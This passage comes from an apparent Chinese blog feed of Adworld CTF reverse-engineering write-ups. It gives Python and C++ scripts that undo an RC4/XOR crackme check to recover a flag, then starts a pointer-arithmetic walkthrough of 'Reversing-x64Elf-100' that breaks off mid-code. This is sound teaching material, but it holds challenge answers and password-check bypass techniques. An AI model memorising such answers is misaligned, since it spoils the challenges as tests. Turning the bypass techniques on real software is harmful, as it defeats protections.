<code>v10[]</code> 中的内容可以根据最后的判断语句 <code>(v10[i] ^ 0x22) == byte_14013B000[i]</code> 得到</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">Str <span class="token operator">=</span> <span class="token string">"12345678abcdefghijklmnopqrspxyz"</span>    <span class="token comment"># 密钥key</span>flag <span class="token operator">=</span> <span class="token string">""</span>byte_14013B000 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>v10 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"v10: "</span><span class="token punctuation">)</span><span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v10<span class="token punctuation">.</span>append<span class="token punctuation">(</span>byte_14013B000<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x22</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>v10<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token comment"># ---------------------RC4---------------------</span><span class="token comment"># rc4_init</span>s_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ns_box_1: "</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 初始化s_box</span>    s_box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>v6 <span class="token operator">=</span> <span class="token number">0</span>v7 <span class="token operator">=</span> <span class="token number">0</span>v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 打乱s_box的顺序</span>    v8 <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>Str<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment"># &amp;0xff 取后8位，等价于 %256，大小不会超过255</span>    s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>v7<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v8    v6 <span class="token operator">=</span> v6 <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> v6 <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">:</span>        v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ns_box_2: "</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token comment"># rc4_crypt</span>v5 <span class="token operator">=</span> <span class="token number">0</span>v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v5 <span class="token operator">=</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment"># &amp;0xff 取后8位，等价于 %256</span>    v7 <span class="token operator">=</span> s_box<span class="token punctuation">[</span>v5<span class="token punctuation">]</span>    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> v6<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment"># &amp;0xff 取后8位，等价于 %256</span>    v8 <span class="token operator">=</span> s_box<span class="token punctuation">[</span>v6<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v8    s_box<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> v7    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>v10<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s_box<span class="token punctuation">[</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># &amp;0xff 取后8位，等价于 %256</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nflag: "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><blockquote><p>直接基于 IDA 伪代码进行重写</p></blockquote><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span>    <span class="token comment">//Windows.h 与 windows.h 没区别</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>__int64 __fastcall <span class="token function">sub_140001120</span><span class="token punctuation">(</span>DWORD <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//传的是char类型，不是_int64</span>    __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>    <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-24h]</span>    <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-20h]</span>    <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-1Ch]</span>    DWORD <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-18h]    //_DWORD 需改为 DWORD</span>    <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>        v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        v7 <span class="token operator">=</span> <span class="token punctuation">(</span>a2<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">+</span> v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>    <span class="token comment">// &amp;0xff 取后8位，等价于 %256</span>        v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span>        v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v6 <span class="token operator">>=</span> a3 <span class="token punctuation">)</span>            v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>DWORD <span class="token operator">*</span>__fastcall <span class="token function">sub_140001240</span><span class="token punctuation">(</span>DWORD <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//传的是char类型，不是_int64</span>    DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// rax</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>    <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-24h]</span>    <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-20h]</span>    <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-1Ch]</span>    <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-18h]</span>    DWORD <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-10h]</span>    v5 <span class="token operator">=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>    v6 <span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a3<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v5 <span class="token operator">=</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>        v7 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">;</span>        v6 <span class="token operator">=</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> v6<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>        v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">;</span>        v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>        v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>        a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v9<span class="token punctuation">[</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>    <span class="token comment">// &amp;0xff 取后8位，等价于 %256</span>    <span class="token punctuation">&#125;</span>    <span class="token operator">*</span>a1 <span class="token operator">=</span> v5<span class="token punctuation">;</span>    result <span class="token operator">=</span> a1<span class="token punctuation">;</span>    a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> v10<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-C8h] BYREF</span>    <span class="token keyword">char</span> Str<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-A8h] BYREF</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> byte_14013B000<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span>            <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>Str<span class="token punctuation">,</span> <span class="token string">"12345678abcdefghijklmnopqrspxyz"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Str<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x60u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>v10<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x17u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DWORD<span class="token operator">*</span> v9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x408u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//函数形参是 DWORD 类型</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"v10[i]: "</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">22</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        v10<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> byte_14013B000<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x22</span><span class="token punctuation">;</span>        cout<span class="token operator">&lt;&lt;</span><span class="token keyword">int</span><span class="token punctuation">(</span>v10<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_140001120</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> Str<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// rc4_init</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"s_box: "</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cout<span class="token operator">&lt;&lt;</span>v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    v4 <span class="token operator">=</span> <span class="token number">0x17u</span><span class="token punctuation">;</span>    <span class="token function">sub_140001240</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> v10<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// rc4_crypt</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"flag: "</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">22</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cout<span class="token operator">&lt;&lt;</span>v10<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{nice_to_meet_you}]</p></blockquote><h2 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypt4.png" alt="攻防世界-crypt4.png"></p><h2 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypt5.png" alt="攻防世界-crypt5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】Reversing-x64Elf-100</title>
      <link href="/posts/b931fee8.html"/>
      <url>/posts/b931fee8.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><mark>要能看出 v3 是一个二维字符数组</mark>，根据代码：</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 v3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-20h]</span>v3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Dufhbmf"</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"pG`imos"</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"ewUglpt"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><strong>要能读懂 <code>*(v3[i % 3] + 2 * (i / 3))</code> 表示的意思：</strong><br>对于二维数组 <code>v3</code> 来说，<code>v3[]</code> 实际代表的也是一个首地址：<code>v3[][0]</code> 的地址，所以 <code>2 * (i / 3)</code> 其实是首地址的偏移，因此 <code>v3[i % 3] + 2 * (i / 3)</code> 代表的是 <code>v3[][]</code> 的地址，所以 <code>*(v3[i % 3] + 2 * (i / 3))</code> 代表的是 <code>v3[][]</code> 的值，即：字符串（字符数组） <code>v3[]</code> 中的一个字符</p></li><li><p><strong>在 Python 中，整数类型除法，如果除不断，结果会转化为浮点型，所以在 Python 中数组下标的 <code>2 * (i / 3)</code> 要写成 <code>2 * int (i / 3)</code></strong></p></li><li><p>找准 flag 的表示，本题循环中用 <code>*(i + a1)</code> 代表 flag 中的每一个字符，直接根据条件表示出 <code>*(i + a1)</code> 即可</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=7be710f6-2477-4035-8b60-8f91f9dffafd_2&task_category_id=4">【攻防世界】Reversing-x64Elf-100</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>IDA 查看 main</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Reversing-x64Elf-100%201.png" alt="攻防世界-Reversing-x64Elf-100 1.png"></p><p>输入的字符串 s 经过 <code>sub_4006FD(s)</code> 处理后若返回 0，则破解成功</p><p>查看 <code>sub_4006FD(s)</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Reversing-x64Elf-100%202.png" alt="攻防世界-Reversing-x64Elf-100 2.png"></p><p>输入的字符串 s 中的每一个字符经过 for 循环处理后，均必须满足 <code>*(v3[i % 3] + 2 * (i / 3)) - *(i + a1) == 1</code>，否则返回1，破解失败</p><p>根据代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 v3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-20h]</span>v3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Dufhbmf"</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"pG\`imos"</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"ewUglpt"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以判断，v3 是一个二维数组【v3 是一个数组，而 v3 的每一个元素又都是一个字符串（char 数组）】</p><p>注意这里条件语句的写法：<br><code>*(v3[i % 3] + 2 * (i / 3))</code> ，* 是加在整体上的，所以 * 表示取 <code>v3[i % 3] + 2 * (i / 3)</code> 这个地址上的值，而 v3 是一个二维数组，所以 <code>v3[i % 3]</code> 代表的其实是一个首地址，即 <code>v3[i % 3][0]</code> 的地址，后面的 <code>2 * (i / 3)</code> 其实是一个偏移量，所以 <code>*(v3[i % 3] + 2 * (i / 3))</code> 指的是 <code>v3[i % 3][2 * (i / 3)]</code> 的值</p><p>a1 是输入的字符串 s 的首地址，每一轮循环中的 <code>*(i + a1)</code> 其实就是 s 中的每一个对应元素，因此求出每一轮 <code>*(i + a1)</code> 的值就是 s 中的每一个元素的值，而 v3 中的值并未发生修改，所以根据 <code>*(v3[i % 3] + 2 * (i / 3)) - *(i + a1) == 1</code> 的条件可得：<code>*(i + a1) = *(v3[i % 3] + 2 * (i / 3)) - 1，即： *(i + a1) = v3[i % 3][2 * (i / 3)] - 1</code></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    string v3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Dufhbmf"</span><span class="token punctuation">;</span>    v3<span 